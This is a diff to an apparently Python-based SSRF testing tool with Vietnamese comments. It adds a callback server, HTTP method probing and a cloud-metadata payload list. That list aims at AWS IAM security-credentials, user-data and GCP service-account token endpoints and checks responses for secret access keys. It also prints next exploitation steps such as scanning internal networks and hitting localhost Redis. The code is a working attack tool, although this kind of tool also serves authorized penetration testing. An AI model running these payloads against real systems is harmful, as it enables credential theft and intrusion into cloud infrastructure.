@@ -12,6 +12,12 @@ from typing import Dict, List, Optional
 from datetime import datetime
 from queue import Queue
 import uuid
+import logging
+import sqlite3
+import json
+import os
+
+logger = logging.getLogger(__name__)
 
 class CallbackHandler(BaseHTTPRequestHandler):
     """HTTP Request Handler để nhận callbacks"""
@@ -34,14 +40,44 @@ class CallbackHandler(BaseHTTPRequestHandler):
     def _handle_request(self, method: str):
         """Handle bất kỳ HTTP method nào"""
         # Lấy request details
+        client_ip = self.client_address[0]
+        
+        # ⚠️ Với ngrok/proxy, phải check X-Forwarded-For để lấy IP thật
+        forwarded_for = self.headers.get('X-Forwarded-For')
+        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else client_ip
+        
+        # Check xem có phải từ localhost không
+        is_local = real_ip in ['127.0.0.1', '::1', 'localhost'] or real_ip.startswith('192.168.') or real_ip.startswith('10.') or real_ip.startswith('172.')
+        
+        # ✅ Xác định SSRF: Request từ IP PUBLIC, không phải localhost/private IP
+        is_ssrf_candidate = not is_local
+        
         callback_data = {
             'timestamp': datetime.now().isoformat(),
             'method': method,
             'path': self.path,
             'headers': dict(self.headers),
-            'client_address': self.client_address[0],
-            'client_port': self.client_address[1]
+            'client_address': client_ip,
+            'real_ip': real_ip,
+            'client_port': self.client_address[1],
+            'is_local': is_local,
+            'is_ssrf': is_ssrf_candidate,
+            'analysis': '⚠️ LOCAL/PRIVATE (your network)' if is_local else '✅ PUBLIC IP (potential SSRF!)'
         }
+        
+        # Print callback info to console for debugging
+        print(f"\n{'='*60}")
+        print(f"📞 CALLBACK RECEIVED!")
+        print(f"Time: {callback_data['timestamp']}")
+        print(f"From: {client_ip}:{self.client_address[1]}")
+        if real_ip != client_ip:
+            print(f"Real IP (via X-Forwarded-For): {real_ip}")
+        print(f"Status: {callback_data['analysis']}")
+        print(f"🎯 SSRF Detected: {'YES ✅' if is_ssrf_candidate else 'NO ❌ (local/test request)'}")
+        print(f"Method: {method}")
+        print(f"Path: {self.path}")
+        print(f"User-Agent: {self.headers.get('User-Agent', 'N/A')}")
+        print(f"{'='*60}\n")
         
         # Read body nếu có
         content_length = self.headers.get('Content-Length')
@@ -282,6 +318,7 @@ class CallbackServer:
         self.is_running = False
         self.callbacks = []
         self._callback_addresses = []  # Store possible callback addresses
+        self.db_path = 'tools/callbacks.db'  # Database path for checking callbacks
     
     def start(self) -> str:
         """Start callback server"""
@@ -391,26 +428,82 @@ class CallbackServer:
         
         return unique_addresses
     
-    def check_callback_received(self, path: str, timeout: int = 2) -> bool:
+    def warm_up_ngrok_url(self, ngrok_url: str) -> bool:
+        """
+        🔥 Check if ngrok URL has warning page
+        
+        Ngrok free plan hiển thị warning page cho first-time visitors.
+        Function này kiểm tra xem URL có accessible không.
+        
+        Returns:
+            bool: True nếu URL accessible (no warning), False nếu có warning page
+        """
+        try:
+            logger.info(f"🔥 Checking ngrok URL accessibility: {ngrok_url}")
+            
+            # Test request to check accessibility
+            response = requests.get(
+                f"{ngrok_url}/warmup_test",
+                timeout=10,
+                allow_redirects=True,
+                verify=False
+            )
+            
+            content_len = len(response.text)
+            
+            # Ngrok warning page is typically 2000-3000 bytes HTML
+            if content_len > 1000 and response.status_code == 200:
+                content_lower = response.text.lower()
+                if 'ngrok' in content_lower or 'interstitial' in content_lower:
+                    logger.warning("⚠️  Ngrok warning/interstitial page detected!")
+                    logger.warning(f"    Page size: {content_len} bytes")
+                    logger.warning("    ")
+                    logger.warning("    🔧 SOLUTIONS:")
+                    logger.warning("    1. Visit ngrok URL in browser → Click 'Visit Site'")
+                    logger.warning("    2. Use paid ngrok plan (no warning page)")
+                    logger.warning("    3. Use alternative tunnel (serveo, localhost.run)")
+                    logger.warning("    ")
+                    logger.warning("    📖 See NGROK_SOLUTIONS.md for detailed guide")
+                    return False
+            
+            # Small response = callback server response
+            if response.status_code == 200 and content_len <= 100:
+                logger.info(f"✅ Ngrok URL accessible! (response: {content_len} bytes)")
+                return True
+            
+            # Other responses - might be OK
+            logger.info(f"✅ URL responding (status: {response.status_code}, size: {content_len})")
+            return True
+                
+        except requests.exceptions.RequestException as e:
+            logger.error(f"❌ Failed to test ngrok URL: {e}")
+            return False
+        except Exception as e:
+            logger.error(f"❌ Warmup error: {e}")
+            return False
+    
+    def check_callback_received(self, path: str, timeout: int = 10) -> bool:
         """
         Check if a specific callback was received
         
         Args:
             path: The expected path (e.g., "/ssrf_test_1_compare_url")
-            timeout: How long to wait for the callback
+            timeout: How long to wait for the callback (default 10s for ngrok + remote targets)
         
         Returns:
             True if callback was received, False otherwise
         """
         start_time = time.time()
         
-        # First, check existing callbacks
+        # First, check existing callbacks in memory
         for callback in self.callbacks:
             if callback.get('path', '').startswith(path):
                 return True
         
-        # Wait for new callbacks
+        # Wait for new callbacks (check both queue and database)
+        last_db_check = 0
         while time.time() - start_time < timeout:
+            # Check queue first (fast)
             try:
                 callback = CallbackHandler.callback_queue.get(timeout=0.1)
                 self.callbacks.append(callback)
@@ -420,7 +513,32 @@ class CallbackServer:
                     return True
                     
             except:
-                continue
+                pass
+            
+            # Also check database every 0.5s (in case callback was saved but not queued yet)
+            current_time = time.time()
+            if current_time - last_db_check >= 0.5:
+                last_db_check = current_time
+                try:
+                    logger.debug(f"🔍 Checking database for path: {path}")
+                    conn = sqlite3.connect(self.db_path)
+                    cursor = conn.cursor()
+                    cursor.execute(
+                        "SELECT * FROM callbacks WHERE path LIKE ? ORDER BY id DESC LIMIT 10",
+                        (f"{path}%",)
+                    )
+                    rows = cursor.fetchall()
+                    conn.close()
+                    
+                    logger.debug(f"🔍 Database returned {len(rows)} rows")
+                    if rows:
+                        logger.info(f"✅ Found callback in database: {rows[0][3]}")  # path is 4th column
+                        return True
+                except Exception as e:
+                    logger.error(f"❌ Database check error: {e}")
+                    pass
+            
+            time.sleep(0.1)  # Small delay between checks
                 
         return False
     
@@ -449,6 +567,334 @@ class ExternalCallbackDetector:
         self.callback_server = callback_server
         self.session = requests.Session()
         self.test_results = []
+    
+    def _extract_searchable_text(self, response_text: str) -> str:
+        """
+        Extract searchable text from response
+        Handles both plain text and JSON responses with nested content
+        """
+        searchable_text = response_text
+        
+        # Try to parse as JSON and extract common content fields
+        try:
+            data = json.loads(response_text)
+            if isinstance(data, dict):
+                # Common fields that might contain fetched content
+                content_fields = [
+                    'content', 'content_preview', 'body', 'text', 'data',
+                    'response', 'result', 'output', 'html', 'page_content'
+                ]
+                
+                # Extract all matching fields
+                extracted = []
+                for field in content_fields:
+                    if field in data:
+                        value = data[field]
+                        if isinstance(value, str):
+                            extracted.append(value)
+                        elif value:
+                            extracted.append(str(value))
+                
+                # If we found content fields, use them; otherwise use full JSON
+                if extracted:
+                    searchable_text = ' '.join(extracted)
+                else:
+                    searchable_text = json.dumps(data)
+        except (json.JSONDecodeError, ValueError):
+            # Not JSON, use original text
+            pass
+        
+        return searchable_text
+    
+    def _get_custom_headers(self) -> Dict[str, str]:
+        """
+        Get custom HTTP headers from environment variable
+        Format: CUSTOM_HEADERS=Header1: Value1 | Header2: Value2
+        """
+        custom_headers = {}
+        
+        # Try to read from environment
+        env_headers = os.getenv('CUSTOM_HEADERS', '')
+        
+        # If not in env, try to read from .env file directly
+        if not env_headers:
+            try:
+                env_file = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), '.env')
+                if os.path.exists(env_file):
+                    with open(env_file, 'r', encoding='utf-8') as f:
+                        for line in f:
+                            line = line.strip()
+                            if line.startswith('CUSTOM_HEADERS='):
+                                env_headers = line.split('=', 1)[1]
+                                break
+            except Exception as e:
+                print(f"Warning: Could not read .env file: {e}")
+        
+        if env_headers:
+            # Split by | for multiple headers
+            for header_str in env_headers.split('|'):
+                header_str = header_str.strip()
+                if ':' in header_str:
+                    name, value = header_str.split(':', 1)
+                    custom_headers[name.strip()] = value.strip()
+        
+        return custom_headers
+    
+    def detect_endpoint_methods(self, target_url: str, timeout: int = 5) -> Dict:
+        """
+        Detect supported HTTP methods WITHOUT using OPTIONS
+        Thử trực tiếp các methods phổ biến và analyze response
+        
+        Returns:
+            {
+                'supported_methods': ['GET', 'POST', ...],
+                'content_type': 'json' | 'form' | 'unknown',
+                'status_codes': {'GET': 200, 'POST': 201, ...},
+                'details': {...}
+            }
+        """
+        print(f"\n[*] 🔍 Detecting supported HTTP methods for: {target_url}")
+        print(f"[*] Testing common methods: GET, POST, PUT, DELETE, PATCH...\n")
+        
+        supported_methods = []
+        status_codes = {}
+        content_type = 'unknown'
+        allow_header = None
+        
+        test_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD']
+        
+        for method in test_methods:
+            try:
+                # Prepare minimal request
+                kwargs = {
+                    'timeout': timeout,
+                    'allow_redirects': False,
+                    'headers': {
+                        'User-Agent': 'Mozilla/5.0 (SSRF-Test)',
+                        'Accept': 'application/json, text/html, */*'
+                    }
+                }
+                
+                # Add empty body for POST/PUT/PATCH
+                if method in ['POST', 'PUT', 'PATCH']:
+                    kwargs['json'] = {}  # Try JSON first
+                
+                # Send request
+                response = self.session.request(method, target_url, **kwargs)
+                status_codes[method] = response.status_code
+                
+                # Method is supported if NOT 405 (Method Not Allowed) or 501 (Not Implemented)
+                if response.status_code not in [405, 501]:
+                    supported_methods.append(method)
+                    print(f"    ✅ {method:6} - Status {response.status_code} - SUPPORTED")
+                    
+                    # Detect content-type from response
+                    resp_content_type = response.headers.get('content-type', '').lower()
+                    if 'application/json' in resp_content_type:
+                        content_type = 'json'
+                    elif 'application/x-www-form-urlencoded' in resp_content_type:
+                        content_type = 'form'
+                else:
+                    print(f"    ❌ {method:6} - Status {response.status_code} - NOT ALLOWED")
+                    
+                    # Check Allow header
+                    if response.status_code == 405:
+                        allow_header = response.headers.get('Allow', '')
+                
+            except requests.exceptions.Timeout:
+                print(f"    ⏱️  {method:6} - TIMEOUT")
+                status_codes[method] = 'timeout'
+            except Exception as e:
+                print(f"    ⚠️  {method:6} - ERROR: {str(e)[:50]}")
+                status_codes[method] = f'error: {str(e)[:30]}'
+        
+        # Parse Allow header if available
+        if allow_header and not supported_methods:
+            print(f"\n[*] 📋 Allow header found: {allow_header}")
+            allowed_methods = [m.strip().upper() for m in allow_header.split(',')]
+            supported_methods.extend(allowed_methods)
+        
+        # If no methods detected, assume GET is available
+        if not supported_methods:
+            print(f"\n[!] ⚠️  No methods explicitly supported, assuming GET")
+            supported_methods = ['GET']
+        
+        result = {
+            'target_url': target_url,
+            'supported_methods': supported_methods,
+            'content_type': content_type,
+            'status_codes': status_codes,
+            'allow_header': allow_header,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        print(f"\n[+] ✅ Detection complete:")
+        print(f"    Supported methods: {', '.join(supported_methods)}")
+        print(f"    Content-Type: {content_type}")
+        print()
+        
+        return result
+    
+    def test_cloud_metadata(self, target_url: str, parameter: str, 
+                            method: str = 'POST', timeout: int = 10) -> Dict:
+        """
+        Test SSRF với cloud metadata endpoints (AWS, GCP, Azure)
+        Không cần callback server - detect bằng response content
+        
+        Returns:
+            Dict với kết quả test cho từng cloud provider
+        """
+        # Get custom headers from env (e.g., Authorization)
+        custom_headers = self._get_custom_headers()
+        
+        print(f"\n[*] ☁️  Testing Cloud Metadata SSRF on {target_url}")
+        print(f"[*] Parameter: {parameter}, Method: {method}")
+        if custom_headers:
+            print(f"[+] 🔐 Using {len(custom_headers)} custom header(s): {', '.join(custom_headers.keys())}")
+        else:
+            print(f"[!] ⚠️  WARNING: No Authorization header found!")
+            print(f"[!] ⚠️  Endpoint may require authentication - check CUSTOM_HEADERS in .env")
+        
+        # Cloud metadata endpoints
+        cloud_payloads = [
+            {
+                'name': 'AWS Metadata',
+                'url': 'http://169.254.169.254/latest/meta-data/',
+                'indicators': ['ami-id', 'instance-id', 'hostname', 'placement']
+            },
+            {
+                'name': 'AWS IAM Credentials',
+                'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+                'indicators': ['AccessKeyId', 'SecretAccessKey', 'Token']
+            },
+            {
+                'name': 'AWS User Data',
+                'url': 'http://169.254.169.254/latest/user-data/',
+                'indicators': ['#!/bin/', 'password', 'secret', 'key']
+            },
+            {
+                'name': 'GCP Metadata',
+                'url': 'http://metadata.google.internal/computeMetadata/v1/',
+                'indicators': ['instance/', 'project/', 'oslogin']
+            },
+            {
+                'name': 'GCP Service Account Token',
+                'url': 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
+                'indicators': ['access_token', 'expires_in', 'token_type']
+            },
+            {
+                'name': 'Azure Metadata',
+                'url': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                'indicators': ['compute', 'vmId', 'subscriptionId']
+            },
+            {
+                'name': 'Docker Metadata',
+                'url': 'http://172.17.0.1',
+                'indicators': ['docker', 'container']
+            }
+        ]
+        
+        results = []
+        vulnerable_payloads = []
+        
+        for payload in cloud_payloads:
+            print(f"\\n[*] Testing {payload['name']}...")
+            print(f"    Payload: {payload['url']}")
+            
+            try:
+                headers = {
+                    'ngrok-skip-browser-warning': 'true',
+                    'User-Agent': 'Mozilla/5.0 (SSRF-Test)'
+                }
+                
+                # Add custom headers (Authorization, etc.)
+                headers.update(custom_headers)
+                
+                # Send request with cloud metadata URL
+                if method.upper() == 'GET':
+                    test_url = f"{target_url}?{parameter}={payload['url']}"
+                    response = self.session.get(test_url, timeout=timeout, headers=headers)
+                elif method.upper() == 'POST':
+                    headers['Content-Type'] = 'application/json'
+                    response = self.session.post(
+                        target_url,
+                        json={parameter: payload['url']},
+                        timeout=timeout,
+                        headers=headers
+                    )
+                else:
+                    headers['Content-Type'] = 'application/json'
+                    response = self.session.request(
+                        method.upper(),
+                        target_url,
+                        json={parameter: payload['url']},
+                        timeout=timeout,
+                        headers=headers
+                    )
+                
+                response_text = response.text
+                
+                # Extract searchable text (handles JSON with nested content)
+                searchable_text = self._extract_searchable_text(response_text)
+                searchable_lower = searchable_text.lower()
+                
+                # Check if response contains cloud metadata indicators
+                found_indicators = [ind for ind in payload['indicators'] if ind.lower() in searchable_lower]
+                is_vulnerable = len(found_indicators) > 0
+                
+                result = {
+                    'payload_name': payload['name'],
+                    'payload_url': payload['url'],
+                    'is_vulnerable': is_vulnerable,
+                    'status_code': response.status_code,
+                    'response_length': len(response_text),
+                    'found_indicators': found_indicators,
+                    'response_preview': response_text[:500] if is_vulnerable else None,
+                    'searchable_content': searchable_text[:200] if is_vulnerable else None
+                }
+                
+                results.append(result)
+                
+                if is_vulnerable:
+                    vulnerable_payloads.append(payload['name'])
+                    print(f"    ✅ VULNERABLE! Found indicators: {', '.join(found_indicators)}")
+                    print(f"    Response preview: {response_text[:200]}...")
+                else:
+                    print(f"    ❌ Not vulnerable (no metadata found)")
+                    
+            except Exception as e:
+                print(f"    ⚠️  Error: {str(e)}")
+                results.append({
+                    'payload_name': payload['name'],
+                    'payload_url': payload['url'],
+                    'is_vulnerable': False,
+                    'error': str(e)
+                })
+        
+        summary = {
+            'target_url': target_url,
+            'parameter': parameter,
+            'method': method,
+            'total_payloads': len(cloud_payloads),
+            'vulnerable_payloads': len(vulnerable_payloads),
+            'is_vulnerable': len(vulnerable_payloads) > 0,
+            'vulnerable_clouds': vulnerable_payloads,
+            'results': results,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        print(f"\\n{'='*60}")
+        print(f"☁️  CLOUD METADATA TEST SUMMARY")
+        print(f"{'='*60}")
+        print(f"Target: {target_url}")
+        print(f"Vulnerable payloads: {len(vulnerable_payloads)}/{len(cloud_payloads)}")
+        if vulnerable_payloads:
+            print(f"✅ SSRF CONFIRMED via: {', '.join(vulnerable_payloads)}")
+        else:
+            print(f"❌ No cloud metadata SSRF detected")
+        print(f"{'='*60}\\n")
+        
+        return summary
     
     def test_ssrf(self, target_url: str, parameter: str, 
                   method: str = 'GET', timeout: int = 10) -> Dict:
@@ -484,14 +930,37 @@ class ExternalCallbackDetector:
             
             # Send SSRF payload
             try:
+                # ✅ Add ngrok bypass header (để bypass "visit site" barrier)
+                headers = {
+                    'ngrok-skip-browser-warning': 'true',
+                    'User-Agent': 'Mozilla/5.0 (SSRF-Test)'
+                }
+                
+                # Add custom headers from env (Authorization, etc.)
+                custom_headers = self._get_custom_headers()
+                headers.update(custom_headers)
+                
                 if method.upper() == 'GET':
                     test_url = f"{target_url}?{parameter}={callback_url}"
-                    response = self.session.get(test_url, timeout=timeout)
-                else:
+                    response = self.session.get(test_url, timeout=timeout, headers=headers)
+                elif method.upper() == 'POST':
+                    # Try POST with JSON body first (modern APIs)
+                    headers['Content-Type'] = 'application/json'
                     response = self.session.post(
                         target_url,
-                        data={parameter: callback_url},
-                        timeout=timeout
+                        json={parameter: callback_url},  # ✅ JSON body
+                        timeout=timeout,
+                        headers=headers
+                    )
+                else:
+                    # Other methods (PUT, DELETE, PATCH) with JSON
+                    headers['Content-Type'] = 'application/json'
+                    response = self.session.request(
+                        method.upper(),
+                        target_url,
+                        json={parameter: callback_url},
+                        timeout=timeout,
+                        headers=headers
                     )
                 
                 initial_response = {
@@ -506,22 +975,32 @@ class ExternalCallbackDetector:
             # Wait for callback
             callbacks = self.callback_server.get_callbacks(timeout=5)
             
+            # ✅ CHỈ COUNT callbacks từ PUBLIC IP (không phải localhost/private)
+            ssrf_callbacks = [cb for cb in callbacks if cb.get('is_ssrf', False)]
+            
             attempt = {
                 'address': address,
                 'callback_url': callback_url,
                 'callbacks_received': len(callbacks),
+                'ssrf_callbacks': len(ssrf_callbacks),
                 'callback_details': callbacks,
+                'ssrf_details': ssrf_callbacks,
                 'initial_response': initial_response
             }
             all_attempts.append(attempt)
-            total_callbacks += len(callbacks)
+            total_callbacks += len(ssrf_callbacks)  # Chỉ count SSRF callbacks
             
-            if len(callbacks) > 0:
-                print(f"[+] ✅ SUCCESS! Received callback from {address}")
+            if len(ssrf_callbacks) > 0:
+                print(f"[+] ✅ SSRF CONFIRMED! Received {len(ssrf_callbacks)} callback(s) from PUBLIC IP")
+                for cb in ssrf_callbacks:
+                    print(f"    Real IP: {cb.get('real_ip', cb['client_address'])}")
                 # Found working address, no need to try others
                 break
             else:
-                print(f"[-] No callback received for {address}")
+                if len(callbacks) > 0:
+                    print(f"[~] Received {len(callbacks)} callback(s) but from LOCAL/PRIVATE IP (not SSRF)")
+                else:
+                    print(f"[-] No callback received for {address}")
         
         # Analyze results
         is_vulnerable = total_callbacks > 0
@@ -543,18 +1022,119 @@ class ExternalCallbackDetector:
         }
         
         if is_vulnerable:
-            print(f"[+] SSRF CONFIRMED! Received {total_callbacks} callback(s)")
+            print(f"[+] 🎯 SSRF BEHAVIOR DETECTED!")
+            print(f"[+] Server fetched URL controlled by attacker: {total_callbacks} callback(s)")
+            print(f"[!] ⚠️  NOTE: This confirms server CAN fetch external URLs.")
+            print(f"[!]     To exploit SSRF, attacker can now:")
+            print(f"[!]     - Scan internal network (192.168.x.x)")
+            print(f"[!]     - Access localhost services (127.0.0.1:6379)")
+            print(f"[!]     - Read cloud metadata (169.254.169.254)")
+            print(f"[!]     - Access internal-only services")
             if successful_attempt:
                 for cb in successful_attempt['callback_details']:
                     print(f"    From: {cb['client_address']}:{cb['client_port']}")
                     print(f"    Method: {cb['method']} {cb['path']}")
                     print(f"    User-Agent: {cb['headers'].get('User-Agent', 'N/A')}")
         else:
-            print(f"[-] No callback received (Not vulnerable or callback blocked)")
+            print(f"[-] No SSRF detected (callback not received or blocked)")
+            print(f"    Possible reasons:")
+            print(f"    - URL parameter is validated/whitelisted")
+            print(f"    - Outbound connections are blocked by firewall")
+            print(f"    - Application doesn't fetch external URLs")
             print(f"    Tried addresses: {', '.join([a['address'] for a in all_attempts])}")
         
         self.test_results.append(result)
         return result
+    
+    def test_ssrf_multi_method(self, target_url: str, parameter: str, 
+                               methods: List[str] = None, timeout: int = 10) -> Dict:
+        """
+        Test SSRF với nhiều HTTP methods để xác định endpoint hỗ trợ methods nào
+        
+        Args:
+            target_url: URL của endpoint cần test
+            parameter: Tên parameter để inject SSRF payload
+            methods: Danh sách HTTP methods cần test (default: ['GET', 'POST'])
+            timeout: Timeout cho mỗi request
+        
+        Returns:
+            Dict với kết quả test cho từng method:
+            {
+                'target_url': str,
+                'parameter': str,
+                'methods_tested': List[str],
+                'vulnerable_methods': List[str],
+                'method_results': {
+                    'GET': {...result...},
+                    'POST': {...result...},
+                    ...
+                },
+                'summary': {...}
+            }
+        """
+        if methods is None:
+            methods = ['GET', 'POST']  # Default test both GET and POST
+        
+        print(f"\n{'='*60}")
+        print(f"🔬 MULTI-METHOD SSRF TESTING")
+        print(f"{'='*60}")
+        print(f"🎯 Target: {target_url}")
+        print(f"📝 Parameter: {parameter}")
+        print(f"🔧 Methods to test: {', '.join(methods)}")
+        print(f"{'='*60}\n")
+        
+        method_results = {}
+        vulnerable_methods = []
+        
+        for method in methods:
+            print(f"\n📌 Testing with HTTP {method.upper()}...")
+            print(f"{'-'*60}")
+            
+            # Test with this method
+            result = self.test_ssrf(target_url, parameter, method=method, timeout=timeout)
+            method_results[method.upper()] = result
+            
+            # Track vulnerable methods
+            if result.get('is_vulnerable', False):
+                vulnerable_methods.append(method.upper())
+                print(f"✅ {method.upper()} is VULNERABLE to SSRF!")
+            else:
+                print(f"❌ {method.upper()} is NOT vulnerable (or blocked)")
+            
+            print(f"{'-'*60}")
+            
+            # Small delay between tests
+            if method != methods[-1]:
+                time.sleep(1)
+        
+        # Create comprehensive result
+        comprehensive_result = {
+            'target_url': target_url,
+            'parameter': parameter,
+            'methods_tested': [m.upper() for m in methods],
+            'vulnerable_methods': vulnerable_methods,
+            'method_results': method_results,
+            'summary': {
+                'total_methods_tested': len(methods),
+                'vulnerable_methods_count': len(vulnerable_methods),
+                'is_vulnerable': len(vulnerable_methods) > 0,
+                'vulnerability_rate': len(vulnerable_methods) / len(methods) if methods else 0
+            },
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        # Print summary
+        print(f"\n{'='*60}")
+        print(f"📊 MULTI-METHOD TEST SUMMARY")
+        print(f"{'='*60}")
+        print(f"🎯 Endpoint: {target_url}")
+        print(f"📝 Parameter: {parameter}")
+        print(f"🔬 Methods tested: {', '.join(comprehensive_result['methods_tested'])}")
+        print(f"✅ Vulnerable methods: {', '.join(vulnerable_methods) if vulnerable_methods else 'NONE'}")
+        print(f"📈 Vulnerability rate: {comprehensive_result['summary']['vulnerability_rate']:.1%}")
+        print(f"{'='*60}\n")
+        
+        return comprehensive_result
     
     def bulk_test(self, targets: List[Dict], wait_time: int = 2) -> List[Dict]:
         """
